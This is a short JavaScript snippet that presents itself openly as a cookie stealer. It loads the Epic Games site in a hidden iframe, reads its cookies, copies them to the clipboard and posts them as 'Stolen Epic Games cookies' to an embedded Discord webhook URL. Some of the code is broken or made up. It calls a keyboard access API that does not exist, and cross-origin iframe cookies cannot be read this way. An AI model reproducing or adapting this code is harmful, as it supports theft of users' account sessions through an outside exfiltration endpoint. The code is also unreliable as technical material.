// Request keyboard access
navigator.keyboard.requestAccess().then(granted => {
  if (granted) {
    // Inject the script into the Epic Games website
    const iframe = document.createElement('iframe');
    iframe.src = 'https://www.epicgames.com/';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const iframeDocument = iframe.contentDocument;

    // Wait for the cookies to be set
    const checkCookies = setInterval(() => {
      const cookies = iframeDocument.cookie.split('; ');
      const epicGamesCookies = cookies.filter(cookie => {
        return cookie.startsWith('epicgames.com');
      });

      if (epicGamesCookies.length > 0) {
        // Copy the Epic Games cookies to the clipboard
        const clipboard = navigator.clipboard;
        clipboard.writeText(epicGamesCookies.join('; ')).then(() => {
          // Send the stolen cookies to the Discord webhook
          const webhookUrl = 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4';

          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              content: 'Stolen Epic Games cookies:',
              embeds: [
                {
                  fields: epicGamesCookies.map(cookie => {
                    return {
                      name: 'Cookie',
                      value: cookie,
                    };
                  }),
                },
              ],
            }),
          });

          // Clear the interval
          clearInterval(checkCookies);
          // Remove the iframe
          iframe.remove();
        }).catch(error => {
          console.error(error);
        });
      }
    }, 1000);
  }
}).catch(error => {
  console.error(error);
});
